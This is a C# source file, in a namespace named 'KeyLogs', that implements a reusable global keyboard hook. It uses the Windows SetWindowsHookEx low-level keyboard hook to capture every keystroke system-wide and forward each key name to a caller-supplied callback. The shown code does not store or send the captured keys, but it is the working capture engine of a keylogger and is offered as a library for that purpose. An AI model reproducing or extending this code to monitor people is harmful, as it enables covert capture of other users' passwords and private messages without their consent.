using System;
using System.Windows.Forms;
using System.Runtime.InteropServices; 
using System.Diagnostics;

namespace KeyLogs
{
    class GlobalHook
    {
        [DllImport("user32.dll")] //Function Stored in user32.dll, pull function from libary
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

        public delegate void KeySubscribe(string keyCatch); //Delegate used to update program using libary

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static KeySubscribe subscribe = Program.CaptureKey; //User using libary must change "Program.CaptureKey" and create func

        private static int WH_KEYBOARD_LL = 13; //13 to refrence hook in SetWindowsHookEx()
        private static int WM_KEYDOWN = 0x0100; //used in wparam for callback checking non system keys(no alt pressed)
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc inputCall = HookCallBack; //Set Keyboard proc delegate

        public void StartHook()
        {
            hook = SetHook();
            Application.Run();
        }

        public void UnHook()
        {
            UnhookWindowsHookEx(hook);
        }

        private static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if(nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) //Valid key input according to parameters
            {
                int vkCode = Marshal.ReadInt32(lParam);
                subscribe(((Keys)vkCode).ToString()); //Update progam using libary with key
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam); //Other programs may use hooks which need this
        }

        private static IntPtr SetHook()
        {
            Process current = Process.GetCurrentProcess(); //Code block is getting handle to the DLL for the hook procedure
            ProcessModule currentModule = current.MainModule;
            IntPtr moduleHandle = GetModuleHandle(currentModule.ModuleName);

            return SetWindowsHookEx(WH_KEYBOARD_LL, inputCall, moduleHandle, 0); //return hook
        }
    }
}
